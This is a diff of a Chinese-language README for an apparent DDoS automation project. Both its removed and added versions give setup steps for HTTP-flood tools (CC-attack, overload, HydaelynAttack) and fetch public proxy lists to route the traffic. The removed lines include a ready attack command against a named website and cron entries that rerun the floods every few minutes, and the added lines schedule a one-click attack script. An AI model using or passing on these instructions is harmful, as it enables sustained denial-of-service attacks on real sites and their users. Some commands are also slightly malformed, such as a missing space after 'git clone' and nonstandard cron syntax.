@@ -9,68 +9,45 @@
 
 ## 环境级工具
 
-- [x] Linux
 - [x] Python3
+
 - [x] Python3-pip
+
 - [x] [**Leeon123/CC-attack**](https://github.com/Leeon123/CC-attack)
+
 - [x] [**TheSpeedX/PROXY-List**](https://github.com/TheSpeedX/PROXY-List)
-- [x] [**7zx/overload**](https://github.com/7zx/overload)
+
 - [x] [**NyaaCaster/HydaelynAttack**](https://github.com/NyaaCaster/HydaelynAttack)
 
-## linunx系统语法注意
-- 如果是ubuntu debian系的系统，命令前缀使用 apt
-- 如果是centos redhead系的系统，命令前缀使用 yum
-- 如果是非root权限账号，请在上述命令前加 sudo
+  *7zx/overload新版本不支持脚本配置方式和命令行附加方式，且其L7方案必须翻墙，故弃用
 
-## 安装环境依赖
+## 版本更新说明
+- 此前过于细节的进行了原理和操作说明，对一些朋友来说过于繁琐，现开始使用一键式部署和一键式执行方案
+
+## 安装
 ```shell
-apt update -y
-apt install git vim zip python3 python3-pip -y
-curl https://nyaacaster.github.io/Nyaa-Automata/requirements.txt -o requirements.txt
-python3 -m pip install --upgrade pip
-pip3 install -r requirements.txt
+git clonehttps://github.com/NyaaCaster/Nyaa-Automata.git
+cd Nyaa-Automata
+bash setup-ubuntu.sh
 ```
 
-## 安装CC-attack
+- 因为语言格式不同，提供了ubuntu/debian系、countos/red hat系、termux系三种操作系统的sh文件
+- windows系统需要自己预装git和python3，并配置环境变量，建议自强
+
+## 单次执行
+
 ```shell
-git clone https://github.com/Leeon123/CC-attack.git
+bash attack.sh
 ```
 
-## 获取Proxy-List的socks4和proxy喂料包
-```shell
-curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt
-```
-## 安装overload（ddos工具）
-```shell
-git clone https://github.com/7zx/overload.git
-cd overload/
-curl https://nyaacaster.github.io/Nyaa-Automata/overload_p.py -o overload_p.py
-cd ..
-```
-- overload_p.py这个脚本可以自己打开看一下，里面我把手动输入的变量全部写死了以便当自动脚本使用，目标网址可以根据自己情况调整
+- windows系统，在已经配置过python3环境变量的情况下，可以直接执行attack.cmd
+- 如果遇到git拉取和proxy文件拉取遇到网络问题，请自行解决梯子问题
 
-## 安装HydaelynAttack（ddos工具，流量开销大，每轮攻击12M，计费流量的自己规划好开销）
-```shell
-git clone https://github.com/NyaaCaster/HydaelynAttack.git
-```
+## 备注：
 
-## 如果要单独一次性执行cc
-```shell
-python3 ~/CC-attack/cc.py -url http://fwe22.top/ -f ~/proxy.txt -v 5 -s 30
-```
-- 命令中地址自己根据情况调整目标网址
-
-## 如果要单独一次性执行overload
-```shell
-python3 ~/overload/overload_p.py
-```
-- 自己修改建立了新脚本后执行自己的就可以
-
-## 如果要单独性执行HydaelynAttack
-```shell
-python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
-```
-- HydaelynAttack项目有多个脚本可选，具体看该项目说明
+1. HydaelynAttack是个ddos工具，流量开销大，每轮攻击12M，计费流量的自己规划好开销，我的aws服务器曾经一个月无脑挂机烧掉了$59的流量费用
+2. cc-attack基于proxy工作，不使用[**TheSpeedX/PROXY-List**](https://github.com/TheSpeedX/PROXY-List)的proxy的话，也可以自己换成其他的，但必须要有proxy才能工作
+3. attack脚本为一次性执行脚本，如果要周期性自动执行，需要进行执行计划部署
 
 
 ## 部署订制执行计划
@@ -81,9 +58,7 @@ crontab -e
 
 ## 插入的计划任务
 ```shell
-*/12 * * * * python3 ~/CC-attack/cc.py -url http://fwe22.top/ -f ~/proxy.txt -v 5 -s 30
-*/4 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
-0 * * * * python3 ~/overload/overload_p.py
+H/20 * * * * bash ~/Nyaa-Automata/attack.sh
 ```
 - 编辑完成后按esc退出编辑
 - 英文输入 :qw 保存退出，之后即使重启系统，依然会定时执行
